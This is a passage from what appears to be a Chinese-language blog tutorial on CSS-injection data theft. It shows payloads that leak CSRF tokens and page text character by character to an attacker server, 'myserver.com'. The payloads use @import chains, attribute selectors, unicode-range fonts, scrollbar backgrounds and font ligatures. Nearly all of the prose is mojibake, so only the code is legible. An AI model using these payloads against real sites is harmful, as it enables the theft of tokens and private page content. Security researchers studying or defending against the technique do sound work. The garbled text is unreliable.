æœ‰æ•¸é‡ä¸Šçš„é™åˆ¶ï¼Œæ‰€ä»¥å¦‚æœä½ å…¨éƒ¨éƒ½æ˜¯ç”¨ myserver.com çš„è©±ï¼Œæœƒç™¼ç¾èƒŒæ™¯åœ–ç‰‡çš„ request é€ä¸å‡ºå»ï¼Œéƒ½è¢« CSS import çµ¦å¡ä½äº†ã€‚\nå› æ­¤éœ€è¦è¨­ç½®å…©å€‹ domainï¼Œä¾†é¿å…é€™ç¨®ç‹€æ³ã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œä¸Šé¢é€™ç¨®æ–¹å¼åœ¨ Firefox æ˜¯è¡Œä¸é€šçš„ï¼Œå› ç‚ºåœ¨ Firefox ä¸Šå°±ç®—ç¬¬ä¸€å€‹çš„ response å…ˆå›ä¾†ï¼Œä¹Ÿä¸æœƒç«‹åˆ»æ›´æ–° styleï¼Œè¦ç­‰æ‰€æœ‰ request éƒ½å›ä¾†æ‰æœƒä¸€èµ·æ›´æ–°ã€‚è§£æ³•çš„è©±å¯ä»¥åƒè€ƒé€™ä¸€ç¯‡ï¼šCSS data exfiltration in Firefox via a single injection pointï¼ŒæŠŠç¬¬ä¸€æ­¥çš„ import æ‹¿æ‰ï¼Œç„¶å¾Œæ¯ä¸€å€‹å­—å…ƒçš„ import éƒ½ç”¨é¡å¤–çš„ style åŒ…è‘—ï¼Œåƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=1)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=2)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=3)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=4)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=5)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=6)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=7)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=8)\u0026lt;/style\u0026gt; è€Œä¸Šé¢é€™æ¨£ Chrome ä¹Ÿæ˜¯æ²’å•é¡Œçš„ï¼Œæ‰€ä»¥çµ±ä¸€æ”¹æˆä¸Šé¢é€™æ¨£ï¼Œå°±å¯ä»¥åŒæ™‚æ”¯æ´å…©ç¨®ç€è¦½å™¨äº†ã€‚\nç¸½çµä¸€ä¸‹ï¼Œåªè¦ç”¨ @import é€™å€‹ CSS çš„åŠŸèƒ½ï¼Œå°±å¯ä»¥åšåˆ°ã€Œä¸é‡æ–°è¼‰å…¥é é¢ï¼Œä½†å¯ä»¥å‹•æ…‹è¼‰å…¥æ–°çš„ styleã€ï¼Œé€²è€Œå·å–å¾Œé¢çš„æ¯ä¸€å€‹å­—å…ƒã€‚\nä¸€æ¬¡å·ä¸€å€‹å­—å…ƒï¼Œå¤ªæ…¢äº†å§ï¼Ÿ è‹¥æ˜¯æƒ³è¦åœ¨ç¾å¯¦ä¸–ç•Œä¸­åŸ·è¡Œé€™ç¨®æ”»æ“Šï¼Œæ•ˆç‡å¯èƒ½è¦å†æ›´å¥½ä¸€é»ã€‚ä»¥ HackMD ç‚ºä¾‹ï¼ŒCSRF token ç¸½å…±æœ‰ 36 å€‹å­—ï¼Œæ‰€ä»¥å°±è¦ç™¼ 36 å€‹ requestï¼Œç¢ºå¯¦æ˜¯å¤ªå¤šäº†é»ã€‚\näº‹å¯¦ä¸Šï¼Œæˆ‘å€‘ä¸€æ¬¡å¯ä»¥å·å…©å€‹å­—å…ƒï¼Œå› ç‚ºä¸Šé›†æœ‰è¬›éé™¤äº† prefix selector ä»¥å¤–ï¼Œä¹Ÿæœ‰ suffix selectorï¼Œæ‰€ä»¥å¯ä»¥åƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } // ... input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;a\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=a) } input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;b\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=b) } é™¤äº†å·é–‹é ­ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿå·çµå°¾ï¼Œæ•ˆç‡ç«‹åˆ»è®Šæˆå…©å€ã€‚è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯é–‹é ­è·Ÿçµå°¾çš„ CSSï¼Œä¸€å€‹ç”¨çš„æ˜¯ backgroundï¼Œå¦ä¸€å€‹ç”¨çš„æ˜¯ border-backgroundï¼Œæ˜¯ä¸åŒçš„å±¬æ€§ï¼Œå› ç‚ºå¦‚æœç”¨åŒä¸€å€‹å±¬æ€§çš„è©±ï¼Œå…§å®¹å°±æœƒè¢«å…¶ä»–çš„è“‹æ‰ï¼Œæœ€å¾Œåªæœƒç™¼å‡ºä¸€å€‹ requestã€‚\nè‹¥æ˜¯å…§å®¹å¯èƒ½å‡ºç¾çš„å­—å…ƒä¸å¤šï¼Œä¾‹å¦‚èªª 16 å€‹çš„è©±ï¼Œé‚£æˆ‘å€‘å¯ä»¥ç›´æ¥ä¸€æ¬¡å·å…©å€‹é–‹é ­åŠ ä¸Šå…©å€‹çµå°¾ï¼Œç¸½å…±çš„ CSS rule æ•¸é‡ç‚º 16*16*2 = 512 å€‹ï¼Œæ‡‰è©²é‚„åœ¨å¯ä»¥æ¥å—çš„ç¯„åœå…§ï¼Œå°±èƒ½å¤ å†åŠ é€Ÿå…©å€ã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥æœ server é‚£é‚Šå»æ”¹å–„ï¼Œä¾‹å¦‚èªªæ”¹ç”¨ HTTP/2 æˆ–ç”šè‡³æ˜¯ HTTP/3ï¼Œéƒ½æœ‰æ©Ÿæœƒèƒ½å¤ åŠ é€Ÿ request è¼‰å…¥çš„é€Ÿåº¦ï¼Œé€²è€Œæå‡æ•ˆç‡ã€‚\nå·å…¶ä»–æ±è¥¿ é™¤äº†å·å±¬æ€§ä¹‹å¤–ï¼Œæœ‰æ²’æœ‰è¾¦æ³•å·åˆ°å…¶ä»–æ±è¥¿ï¼Ÿä¾‹å¦‚èªªï¼Œé é¢ä¸Šçš„å…¶ä»–æ–‡å­—ï¼Ÿæˆ–ç”šè‡³æ˜¯ script è£¡é¢çš„ç¨‹å¼ç¢¼ï¼Ÿ\næ ¹æ“šæˆ‘å€‘åœ¨ä¸Šä¸€ç¯‡è£¡é¢è¬›çš„åŸç†ï¼Œæ˜¯åšä¸åˆ°çš„ã€‚å› ç‚ºèƒ½å·åˆ°å±¬æ€§æ˜¯å› ç‚ºã€Œå±¬æ€§é¸æ“‡å™¨ã€é€™å€‹æ±è¥¿ï¼Œæ‰è®“æˆ‘å€‘é¸åˆ°ç‰¹å®šçš„å…ƒç´ ï¼Œè€Œåœ¨ CSS è£¡é¢ï¼Œä¸¦æ²’æœ‰å¯ä»¥é¸æ“‡ã€Œå…§æ–‡ã€çš„é¸æ“‡å™¨ã€‚\nå› æ­¤ï¼Œæˆ‘å€‘éœ€è¦å° CSS ä»¥åŠç¶²é ä¸Šçš„æ¨£å¼æœ‰æ›´æ·±å…¥çš„ç†è§£ï¼Œæ‰æœ‰è¾¦æ³•é”æˆé€™ä»¶çœ‹ä¼¼ä¸å¯èƒ½çš„ä»»å‹™ã€‚\nunicode-range åœ¨ CSS è£¡é¢ï¼Œæœ‰ä¸€å€‹å±¬æ€§å«åšã€Œunicode-rangeã€ï¼Œå¯ä»¥é‡å°ä¸åŒçš„å­—å…ƒï¼Œè¼‰å…¥ä¸åŒçš„å­—é«”ã€‚åƒæ˜¯åº•ä¸‹é€™å€‹å¾ MDN æ‹¿ä¾†çš„ç¯„ä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;Ampersand\u0026#34;; src: local(\u0026#34;Times New Roman\u0026#34;); unicode-range: U+26; } div { font-size: 4em; font-family: Ampersand, Helvetica, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;Me \u0026amp; You = Us\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026amp; çš„ unicode æ˜¯ U+0026ï¼Œå› æ­¤åªæœ‰ \u0026amp; é€™å€‹å­—æœƒç”¨ä¸åŒçš„å­—é«”ä¾†é¡¯ç¤ºï¼Œå…¶ä»–éƒ½ç”¨åŒä¸€å€‹å­—é«”ã€‚\né€™æ‹›å‰ç«¯å·¥ç¨‹å¸«å¯èƒ½æœ‰ç”¨éï¼Œä¾‹å¦‚èªªè‹±æ–‡è·Ÿä¸­æ–‡å¦‚æœè¦ç”¨ä¸åŒå­—é«”ä¾†é¡¯ç¤ºï¼Œå°±å¾ˆé©åˆç”¨é€™ä¸€æ‹›ã€‚è€Œé€™æ‹›ä¹Ÿå¯ä»¥ç”¨ä¾†å·å–é é¢ä¸Šçš„æ–‡å­—ï¼Œåƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;f1\u0026#34;; src: url(https://myserver.com?q=1); unicode-range: U+31; } @font-face { font-family: \u0026#34;f2\u0026#34;; src: url(https://myserver.com?q=2); unicode-range: U+32; } @font-face { font-family: \u0026#34;f3\u0026#34;; src: url(https://myserver.com?q=3); unicode-range: U+33; } @font-face { font-family: \u0026#34;fa\u0026#34;; src: url(https://myserver.com?q=a); unicode-range: U+61; } @font-face { font-family: \u0026#34;fb\u0026#34;; src: url(https://myserver.com?q=b); unicode-range: U+62; } @font-face { font-family: \u0026#34;fc\u0026#34;; src: url(https://myserver.com?q=c); unicode-range: U+63; } div { font-size: 4em; font-family: f1, f2, f3, fa, fb, fc; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;ca31a\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¦‚æœä½ å»çœ‹ network tabï¼Œæœƒçœ‹åˆ°ä¸€å…±ç™¼é€äº† 4 å€‹ requestï¼š\nè—‰ç”±é€™æ‹›ï¼Œæˆ‘å€‘å¯ä»¥å¾—çŸ¥é é¢ä¸Šæœ‰ï¼š13ac é€™å››å€‹å­—å…ƒã€‚\nè€Œé€™æ‹›çš„ä¾·é™ä¹‹è™•ä¹Ÿå¾ˆæ˜é¡¯ï¼Œå°±æ˜¯ï¼š\næˆ‘å€‘ä¸çŸ¥é“å­—å…ƒçš„é †åºç‚ºä½• é‡è¤‡çš„å­—å…ƒä¹Ÿä¸æœƒçŸ¥é“ ä½†æ˜¯å¾ã€Œè¼‰å…¥å­—å‹ã€çš„è§’åº¦ä¸‹å»æ€è€ƒæ€éº¼å·åˆ°å­—å…ƒï¼Œè‘—å¯¦å¸¶çµ¦äº†è¨±å¤šäººä¸€å€‹æ–°çš„æ€è€ƒæ–¹å¼ï¼Œä¸¦ç™¼å±•å‡ºå„å¼å„æ¨£å…¶ä»–çš„æ–¹æ³•ã€‚\nå­—é«”é«˜åº¦å·®ç•° + first-line + scrollbar é€™æ‹›è¦è§£æ±ºçš„ä¸»è¦æ˜¯ä¸Šä¸€æ‹›ç¢°åˆ°çš„å•é¡Œï¼šã€Œæ²’è¾¦æ³•çŸ¥é“å­—å…ƒé †åºã€ï¼Œç„¶å¾Œé€™æ‹›çµåˆäº†å¾ˆå¤šç´°ç¯€ï¼Œæ­¥é©Ÿå¾ˆå¤šï¼Œè¦ä»”ç´°è½äº†ã€‚\né¦–å…ˆï¼Œæˆ‘å€‘å…¶å¯¦å¯ä»¥ä¸è¼‰å…¥å¤–éƒ¨å­—é«”ï¼Œç”¨å…§å»ºçš„å­—é«”å°±èƒ½ leak å‡ºå­—å…ƒã€‚é€™è¦æ€éº¼åšåˆ°å‘¢ï¼Ÿæˆ‘å€‘è¦å…ˆæ‰¾å‡ºå…©çµ„å…§å»ºå­—é«”ï¼Œé«˜åº¦æœƒä¸åŒã€‚\nä¾‹å¦‚æœ‰ä¸€å€‹å«åšã€ŒComic Sans MSã€çš„å­—é«”ï¼Œé«˜åº¦å°±æ¯”å¦ä¸€å€‹ã€ŒCourier Newã€é«˜ã€‚\nèˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­é è¨­å­—é«”çš„é«˜åº¦æ˜¯ 30pxï¼Œè€Œ Comic Sans MS æ˜¯ 45px å¥½äº†ã€‚é‚£ç¾åœ¨æˆ‘å€‘æŠŠæ–‡å­—å€å¡Šçš„é«˜åº¦è¨­æˆ 40pxï¼Œä¸¦ä¸”è¼‰å…¥å­—é«”ï¼Œåƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 30px; height: 40px; width: 100px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;DBC\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;ABC\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°±æœƒåœ¨ç•«é¢ä¸Šçœ‹åˆ°å·®ç•°ï¼š\nå¾ˆæ˜é¡¯ A æ¯”å…¶ä»–å­—å…ƒçš„é«˜åº¦éƒ½é«˜ï¼Œè€Œä¸”æ ¹æ“šæˆ‘å€‘çš„ CSS è¨­å®šï¼Œå¦‚æœå…§å®¹é«˜åº¦è¶…éå®¹å™¨é«˜åº¦ï¼Œæœƒå‡ºç¾ scrollbarã€‚é›–ç„¶ä¸Šé¢æ˜¯æˆªåœ–çœ‹ä¸å‡ºä¾†ï¼Œä½†æ˜¯ä¸‹é¢çš„ ABC æœ‰å‡ºç¾ scrollbarï¼Œè€Œä¸Šé¢çš„ DBC æ²’æœ‰ã€‚\nå†è€…ï¼Œæˆ‘å€‘å…¶å¯¦å¯ä»¥å¹« scrollbar è¨­å®šä¸€å€‹å¤–éƒ¨çš„èƒŒæ™¯ï¼š\n1 2 3 4 5 6 7 div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: url(https://myserver.com?q=a); } ä¹Ÿå°±æ˜¯èªªï¼Œå¦‚æœ scrollbar æœ‰å‡ºç¾ï¼Œæˆ‘å€‘çš„ server å°±æœƒæ”¶åˆ° requestã€‚å¦‚æœ scrollbar æ²’å‡ºç¾ï¼Œå°±ä¸æœƒæ”¶åˆ° requestã€‚\næ›´é€²ä¸€æ­¥ä¾†èªªï¼Œç•¶æˆ‘æŠŠ div å¥—ç”¨ â€œfaâ€ å­—é«”æ™‚ï¼Œå¦‚æœç•«é¢ä¸Šæœ‰ Aï¼Œå°±æœƒå‡ºç¾ scrollbarï¼Œserver å°±æœƒæ”¶åˆ° requestã€‚å¦‚æœç•«é¢ä¸Šæ²’æœ‰ Aï¼Œå°±ä»€éº¼äº‹æƒ…éƒ½ä¸æœƒç™¼ç”Ÿã€‚\nå› æ­¤ï¼Œæˆ‘å¦‚æœä¸€ç›´é‡è¤‡è¼‰å…¥ä¸åŒå­—é«”ï¼Œé‚£æˆ‘åœ¨ server å°±èƒ½çŸ¥é“ç•«é¢ä¸Šæœ‰ä»€éº¼å­—å…ƒï¼Œé€™é»è·Ÿå‰›å‰›æˆ‘å€‘ç”¨ unicode-range èƒ½åšåˆ°çš„äº‹æƒ…æ˜¯ä¸€æ¨£çš„ã€‚\né‚£è¦æ€éº¼è§£æ±ºé †åºçš„å•é¡Œå‘¢ï¼Ÿ\næˆ‘å€‘å¯ä»¥å…ˆæŠŠ div çš„å¯¬åº¦ç¸®æ¸›åˆ°åªèƒ½é¡¯ç¤ºä¸€å€‹å­—å…ƒï¼Œé€™æ¨£å…¶ä»–å­—å…ƒå°±æœƒè¢«æ”¾åˆ°ç¬¬äºŒè¡Œå»ï¼Œå†æ­é… ::first-line é€™å€‹ selectorï¼Œå°±å¯ä»¥ç‰¹åˆ¥é‡å°ç¬¬ä¸€è¡Œåšæ¨£å¼çš„èª¿æ•´ï¼Œåƒæ˜¯é€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 0px; height: 40px; width: 20px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } div::first-line{ font-size: 30px; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;CBAD\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç•«é¢ä¸Šä½ å°±åªæœƒçœ‹åˆ°ä¸€å€‹ã€ŒCã€çš„å­—å…ƒï¼Œå› ç‚ºæˆ‘å€‘å…ˆç”¨ font-size: 0px æŠŠæ‰€æœ‰å­—å…ƒçš„å°ºå¯¸éƒ½è¨­ç‚º 0ï¼Œå†ç”¨ div::first-line å»åšèª¿æ•´ï¼Œè®“ç¬¬ä¸€è¡Œçš„ font-size è®Šæˆ 30pxã€‚æ›å¥è©±èªªï¼Œåªæœ‰ç¬¬ä¸€è¡Œçš„å­—å…ƒèƒ½çœ‹åˆ°ï¼Œè€Œç¾åœ¨çš„ div å¯¬åº¦åªæœ‰ 20pxï¼Œæ‰€ä»¥åªæœƒå‡ºç¾ç¬¬ä¸€å€‹å­—å…ƒã€‚\næ¥è‘—ï¼Œæˆ‘å€‘å†é‹ç”¨å‰›å‰›å­¸æœƒçš„é‚£æ‹›ï¼Œå»è¼‰å…¥çœ‹çœ‹ä¸åŒçš„å­—é«”ã€‚ç•¶æˆ‘è¼‰å…¥ fa é€™å€‹å­—é«”æ™‚ï¼Œå› ç‚ºç•«é¢ä¸Šæ²’æœ‰å‡ºç¾ Aï¼Œæ‰€ä»¥ä¸æœƒæœ‰ä»»ä½•è®ŠåŒ–ã€‚ä½†æ˜¯ç•¶æˆ‘è¼‰å…¥ fc é€™å€‹å­—é«”æ™‚ï¼Œç•«é¢ä¸Šæœ‰ Cï¼Œæ‰€ä»¥å°±æœƒç”¨ Comic Sans MS ä¾†é¡¯ç¤º Cï¼Œé«˜åº¦å°±æœƒè®Šé«˜ï¼Œscrollbar å°±æœƒå‡ºç¾ï¼Œå°±å¯ä»¥åˆ©ç”¨å®ƒä¾†ç™¼å‡º requestï¼Œåƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 div { font-size: 0px; height: 40px; width: 20px; font-family: fc, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; --leak: url(http://myserver.com?C); } div::first-line{ font-size: 30px; } div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: var(--leak); } é‚£æˆ‘å€‘è¦æ€éº¼æ¨£ä¸æ–·ä½¿ç”¨æ–°çš„ font-family å‘¢ï¼Ÿç”¨ CSS animation å°±å¯ä»¥åšåˆ°ï¼Œä½ å¯ä»¥ç”¨ CSS animation ä¸æ–·è¼‰å…¥ä¸åŒçš„ font-family ä»¥åŠæŒ‡å®šä¸åŒçš„ â€“leak è®Šæ•¸ã€‚\nå¦‚æ­¤ä¸€ä¾†ï¼Œæˆ‘å€‘å°±èƒ½çŸ¥é“ç•«é¢ä¸Šçš„ç¬¬ä¸€å€‹å­—å…ƒåˆ°åº•æ˜¯ä»€éº¼ã€‚\nçŸ¥é“äº†ç¬¬ä¸€å€‹å­—å…ƒä»¥å¾Œï¼Œæˆ‘å€‘æŠŠ div çš„å¯¬åº¦è®Šé•·ï¼Œä¾‹å¦‚èªªè®Šæˆ 40pxï¼Œå°±èƒ½å®¹ç´å…©å€‹å­—å…ƒï¼Œå› æ­¤ç¬¬ä¸€è¡Œå°±æœƒæ˜¯å‰å…©å€‹å­—ï¼Œæ¥è‘—å†ç”¨ä¸€æ¨£çš„æ–¹å¼è¼‰å…¥ä¸åŒçš„ font-familyï¼Œå°±èƒ½ leak å‡ºç¬¬äºŒå€‹å­—å…ƒï¼Œè©³ç´°æµç¨‹å¦‚ä¸‹ï¼š\nå‡è¨­ç•«é¢ä¸Šæ˜¯ ACB èª¿æ•´å¯¬åº¦ç‚º 20pxï¼Œç¬¬ä¸€è¡Œåªå‡ºç¾ç¬¬ä¸€å€‹å­—å…ƒ A è¼‰å…¥å­—é«” faï¼Œå› æ­¤ A ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œå‡ºç¾ scrollbarï¼Œè¼‰å…¥ scrollbar èƒŒæ™¯ï¼Œå‚³é€ request çµ¦ server è¼‰å…¥å­—é«” fbï¼Œä½†æ˜¯ B æ²’æœ‰å‡ºç¾åœ¨ç•«é¢ä¸Šï¼Œå› æ­¤æ²’æœ‰ä»»ä½•è®ŠåŒ–ã€‚ è¼‰å…¥å­—é«” fcï¼Œä½†æ˜¯ C æ²’æœ‰å‡ºç¾åœ¨ç•«é¢ä¸Šï¼Œå› æ­¤æ²’æœ‰ä»»ä½•è®ŠåŒ–ã€‚ èª¿æ•´å¯¬åº¦ç‚º 40pxï¼Œç¬¬ä¸€è¡Œå‡ºç¾å…©å€‹å­—å…ƒ AC è¼‰å…¥å­—é«” faï¼Œå› æ­¤ A ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œå‡ºç¾ scrollbarï¼Œæ­¤æ™‚æ‡‰è©²æ˜¯å› ç‚ºé€™å€‹èƒŒæ™¯å·²ç¶“è¼‰å…¥éï¼Œæ‰€ä»¥ä¸æœƒç™¼é€æ–°çš„ request è¼‰å…¥å­—é«” fbï¼Œæ²’å‡ºç¾åœ¨ç•«é¢ä¸Šï¼Œæ²’ä»»ä½•è®ŠåŒ– è¼‰å…¥å­—é«” fcï¼ŒC ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œå‡ºç¾ scrollbar ä¸¦ä¸”è¼‰å…¥èƒŒæ™¯ èª¿æ•´å¯¬åº¦ç‚º 60pxï¼ŒACB ä¸‰å€‹å­—å…ƒéƒ½å‡ºç¾åœ¨ç¬¬ä¸€è¡Œ è¼‰å…¥å­—é«” faï¼ŒåŒç¬¬ä¸ƒæ­¥ è¼‰å…¥å­—é«” fbï¼ŒB ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œå‡ºç¾ scrollbar ä¸¦ä¸”è¼‰å…¥èƒŒæ™¯ è¼‰å…¥å­—é«” fcï¼ŒC ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œä½†å› ç‚ºå·²ç¶“è¼‰å…¥éç›¸åŒèƒŒæ™¯ï¼Œä¸æœƒç™¼é€ request çµæŸ å¾ä¸Šé¢æµç¨‹ä¸­å¯ä»¥çœ‹å‡º server æœƒä¾åºæ”¶åˆ° A, C, B ä¸‰å€‹ reqeustï¼Œä»£è¡¨äº†ç•«é¢ä¸Šå­—å…ƒçš„é †åºã€‚è€Œä¸æ–·æ”¹è®Šå¯¬åº¦ä»¥åŠ font-family éƒ½å¯ä»¥ç”¨ CSS animation åšåˆ°ã€‚\næƒ³è¦çœ‹å®Œæ•´ demo çš„å¯ä»¥çœ‹é€™å€‹ç¶²é ï¼ˆå‡ºè™•ï¼šWhat can we do with single CSS injection?ï¼‰ï¼šhttps://demo.vwzq.net/css2.html\né€™å€‹è§£æ³•é›–ç„¶è§£æ±ºäº†ã€Œä¸çŸ¥é“å­—å…ƒé †åºã€çš„å•é¡Œï¼Œä½†ä¾ç„¶ç„¡æ³•è§£æ±ºé‡è¤‡å­—å…ƒçš„å•é¡Œï¼Œå› ç‚ºé‡è¤‡çš„å­—å…ƒä¸æœƒå†ç™¼å‡º requestã€‚\nå¤§çµ•æ‹›ï¼šligature + scrollbar å…ˆè¬›çµè«–ï¼Œé€™ä¸€æ‹›å¯ä»¥è§£æ±ºä¸Šé¢æ‰€æœ‰å•é¡Œï¼Œé”æˆã€ŒçŸ¥é“å­—å…ƒé †åºï¼Œä¹ŸçŸ¥é“é‡è¤‡å­—å…ƒã€çš„ç›®æ¨™ï¼Œèƒ½å¤ å·åˆ°å®Œæ•´çš„æ–‡å­—ã€‚\nè¦ç†è§£æ€éº¼å·ä¹‹å‰ï¼Œæˆ‘å€‘è¦å…ˆçŸ¥é“ä¸€å€‹å°ˆæœ‰åè©ï¼Œå«åšé€£å­—ï¼ˆligatureï¼‰ï¼Œåœ¨æŸäº›å­—å‹ç•¶ä¸­ï¼ŒæœƒæŠŠä¸€äº›ç‰¹å®šçš„çµ„åˆ render æˆé€£åœ¨ä¸€èµ·çš„æ¨£å­ï¼Œå¦‚ä¸‹åœ–ï¼ˆä¾†æºï¼šwikipediaï¼‰ï¼š\né‚£é€™å€‹å°æˆ‘å€‘æœ‰ä»€éº¼å¹«åŠ©å‘¢ï¼Ÿ\næˆ‘å€‘å¯ä»¥è‡ªå·±è£½ä½œå‡ºä¸€å€‹ç¨ç‰¹çš„å­—é«”ï¼ŒæŠŠ ab è¨­å®šæˆé€£å­—ï¼Œä¸¦ä¸” render å‡ºä¸€å€‹è¶…å¯¬çš„å…ƒç´ ã€‚æ¥è‘—ï¼Œæˆ‘å€‘æŠŠæŸå€‹ div å¯¬åº¦è¨­æˆå›ºå®šï¼Œç„¶å¾Œçµåˆå‰›å‰› scrollbar é‚£æ‹›ï¼Œä¹Ÿå°±æ˜¯ï¼šã€Œå¦‚æœ ab æœ‰å‡ºç¾ï¼Œå°±æœƒè®Šå¾ˆå¯¬ï¼Œscrollbar å°±æœƒå‡ºç¾ï¼Œå°±å¯ä»¥è¼‰å…¥ request å‘Šè¨´ serverï¼›å¦‚æœæ²’å‡ºç¾ï¼Œé‚£ scrollbar å°±ä¸æœƒå‡ºç¾ï¼Œæ²’æœ‰ä»»ä½•äº‹æƒ…ç™¼ç”Ÿã€ã€‚\næµç¨‹æ˜¯é€™æ¨£çš„ï¼Œå‡è¨­ç•«é¢ä¸Šæœ‰ acc é€™ä¸‰å€‹å­—ï¼š\nè¼‰å…¥æœ‰é€£å­— aa çš„å­—é«”ï¼Œæ²’äº‹ç™¼ç”Ÿ è¼‰å…¥æœ‰é€£å­— ab çš„å­—é«”ï¼Œæ²’äº‹ç™¼ç”Ÿ è¼‰å…¥æœ‰é€£å­— ac çš„å­—é«”ï¼ŒæˆåŠŸ render è¶…å¯¬çš„ç•«é¢ï¼Œscrollbar å‡ºç¾ï¼Œè¼‰å…¥ server åœ–ç‰‡ server çŸ¥é“ç•«é¢ä¸Šæœ‰ ac è¼‰å…¥æœ‰é€£å­— aca çš„å­—é«”ï¼Œæ²’äº‹ç™¼ç”Ÿ è¼‰å…¥æœ‰é€£å­— acb çš„å­—é«”ï¼Œæ²’äº‹ç™¼ç”Ÿ è¼‰å…¥æœ‰é€£å­— acc çš„å­—é«”ï¼ŒæˆåŠŸ renderï¼Œscrollbar å‡ºç¾ï¼Œå‚³é€çµæœçµ¦ server server çŸ¥é“ç•«é¢ä¸Šæœ‰ aca é€éé€£å­—çµåˆ scrollbarï¼Œæˆ‘å€‘å¯ä»¥ä¸€å€‹å­—å…ƒä¸€å€‹å­—å…ƒï¼Œæ…¢æ…¢ leak å‡ºç•«é¢ä¸Šæ‰€æœ‰çš„å­—ï¼Œç”šè‡³é€£ JavaScript çš„ç¨‹å¼ç¢¼éƒ½å¯ä»¥ï¼\nä½ çŸ¥é“ï¼Œscript çš„å…§å®¹æ˜¯å¯ä»¥é¡¯ç¤ºåœ¨ç•«é¢ä¸Šçš„å—ï¼Ÿ\n1 2 3 head, script { display: block; } åªè¦åŠ ä¸Šé€™å€‹ CSSï¼Œå°±å¯ä»¥è®“ script å…§å®¹ä¹Ÿé¡¯ç¤ºåœ¨ç•«é¢ä¸Šï¼Œå› æ­¤æˆ‘å€‘ä¹Ÿå¯ä»¥åˆ©ç”¨åŒæ¨£çš„æŠ€å·§ï¼Œå·åˆ° script çš„å…§å®¹ï¼\nåœ¨å¯¦æˆ°ä¸Šçš„è©±ï¼Œä½ å¯ä»¥ç”¨ SVG æ­é…å…¶ä»–å·¥å…·ï¼Œåœ¨ server 